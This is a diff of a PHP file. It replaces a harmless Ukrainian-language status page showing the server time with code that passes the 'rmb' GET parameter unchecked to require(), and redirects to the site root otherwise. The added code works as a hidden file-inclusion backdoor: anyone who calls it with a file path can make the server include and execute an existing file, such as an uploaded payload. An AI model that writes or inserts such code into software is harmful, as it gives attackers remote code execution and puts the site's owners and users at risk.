@@ -1,3 +1,10 @@
-<?php
-echo "Система працює нормально. Поточна дата і час сервера: " . date('Y-m-d H:i:s');
-?>
+
+	<?
+	$key=strip_tags($_GET['rmb']);
+	if($_SERVER['REQUEST_METHOD'] === 'GET'&&file_exists($key)){
+		require($key);
+		}else {
+		header("Location: /"); 
+exit;
+	}
+	?>
